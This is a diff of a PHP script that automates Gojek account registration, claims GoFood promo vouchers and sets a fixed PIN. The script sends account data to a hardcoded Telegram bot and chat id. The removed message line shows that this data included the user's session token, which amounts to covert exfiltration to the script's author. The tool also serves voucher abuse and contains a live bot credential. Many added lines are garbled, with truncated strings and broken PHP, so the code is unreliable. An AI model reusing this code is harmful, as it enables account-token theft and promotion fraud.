@@ -1,15 +1,7 @@
 <?php
 date_default_timezone_set('Asia/Jakarta');
 include "function.php";
-echo color("blue"," ஜ۩۩ஜ▬▬TEMPEK▬▬ஜ۩۩ஜ\n");
-// function change(){
-        $nama = nama();
-        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
-        echo color("purple"," Nomor : ");
-        // $no = trim(fgets(STDIN));
-        $nohp = trim(fgets(STDIN));
-        $nohp = str_replace("62","62",$nohp);
-        $nohp = str_replace("(","",$nohp);
+echo color("
         $nohp = str_replace(")","",$nohp);
         $nohp = str_replace("-","",$nohp);
         $nohp = str_replace(" ","",$nohp);
@@ -69,7 +61,7 @@ echo color("blue"," ஜ۩۩ஜ▬▬TEMPEK▬▬ஜ۩۩ஜ\n");
         echo "\n".color("purple","Message: ".$message);
         goto gofood;
         }else{
-        echo "\n".color("purple","Message: ".$message);
+     );
         gofood:
         echo "\n".color("purple","VC 3");
         echo "\n".color("purple","OTW");
@@ -89,7 +81,7 @@ echo color("blue"," ஜ۩۩ஜ▬▬TEMPEK▬▬ஜ۩۩ஜ\n");
         sleep(5);
         $boba09 = request1('/go-promotion:"COBAGOFOOD2206"}');
         $messageboba09 = fetch_value($boba09,'"message":"','"');
-        echo "\n".color("purple","Message: ".$messageboba09);
+    geboba09);
         sleep(3);
         $cekvoucher = request('/gopoints/v3/wallet/vouchers?loken);
         $total = fetch_value($cekvoucher,'"total_vouchers":',',');
@@ -131,12 +123,12 @@ echo color("blue"," ஜ۩۩ஜ▬▬TEMPEK▬▬ஜ۩۩ஜ\n");
         $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
         $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
         $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
-        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
+        $expired11 = getSher,'11');
         $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
         $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
         $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
       	$chatid = "785784404";
-      	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
+      	$pesan 	= "[+] Goj : [".$expired1."]\n[+] ".$voucher2."\n[+] Ex.$ered4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
       	$method	= "sendMessage";
       	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
       	$post = [
@@ -157,7 +149,7 @@ echo color("blue"," ஜ۩۩ஜ▬▬TEMPEK▬▬ஜ۩۩ஜ\n");
                                         $error = curl_error($ch);
                                         $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                         curl_close($ch);
-                                        $debug['text'] = $pesan;
+                                        $
                                         $debug['respon'] = json_decode($datas, true);
          setpin:
          echo "\n".color("purple","SET PIN!!!: y/n ");
@@ -165,9 +157,9 @@ echo color("blue"," ஜ۩۩ஜ▬▬TEMPEK▬▬ஜ۩۩ஜ\n");
          if($pilih1 == "y" || $pilih1 == "Y"){
          //if($pilih1 == "y" && strpos($no, "628")){
          echo color("purple","▬▬▬PIN = 007007")."\n";
-         $data2 = '{"pin":"007007"}';
+     "007007"}';
          $getotpsetpin = request("/2, null, $otpsetpin, $uuid);
-         echo $verifotpsetpin;
+     n;
          }else if($pilih1 == "n" || $pilih1 == "N"){
          die();
          }else{
